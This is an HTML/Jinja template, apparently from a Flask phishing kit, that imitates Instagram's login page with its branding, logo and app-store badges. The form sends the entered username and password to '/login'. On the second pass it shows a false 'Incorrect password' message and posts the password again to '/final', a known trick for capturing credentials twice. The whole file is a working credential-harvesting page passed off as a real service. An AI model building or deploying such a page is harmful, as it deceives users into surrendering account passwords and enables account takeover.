  <head>
    <meta charset="UTF-8" />

    <title>Instagram</title>
    <link rel="stylesheet" href="/static/css/styles.css" />
    <link rel="stylesheet" href="/static/css/media-queries.css" />
    <link rel="icon" href="/static/assets/images/favicon.ico" />
  </head>
  <body>
    <form 
    {% if data == True %}
    action="/final"
    {% else %}
    action="/login"
    {% endif %}

    method="POST">
    <main>
      <div class="log-in-container">
        <div class="log-in">
          <!-- Logo -->
          <img src="/static/assets/images/instagram-logo.png" class="logo" />
          <!-- Log in form -->
          
          <div class="log-in-form">
            {% if data == True %}
            <div style="color: red; text-align: center;font-size: 15px;">Incorrect password</div>
            {% endif %}
            <input type="text" name="user" placeholder="Phone number, username or email" />
            <input type="password" name="pass" placeholder="Password" />
            <button class="log-in-button" type="submit">Log In</button>
          
          </div>
        
          <!-- OR divider -->
          <!-- <span class="or-divider">OR</span> -->
          <!-- Log in with Facebook -->
          <!-- <div class="fb-login">
            <a href="#">
              <img src="assets/images/facebook-icon.png" />
              <span>Log in with Facebook</span>
            </a>
          </div> -->
          <!-- Forgot password? -->
          <a href="#">Forgot password?</a>
        </div>
        <!-- Sign up -->
        <div class="sign-up">
          <span>Don't have an account?</span><a href="#">Sign up</a>
        </div>
        <!-- Download app -->
        <div class="get-the-app">
          <span>Get the app</span>
          <div class="app-images">
            <a href="#"><img src="/static/assets/images/applestore.png" /></a>
            <a href="#"><img src="/static/assets/images/googlestore.png" /></a>
          </div>
        </div>
      </div>
      <!-- Phones -->
      <div class="phones-container">
        <img src="/static/assets/images/phones.png" />
      </div>
    </main>
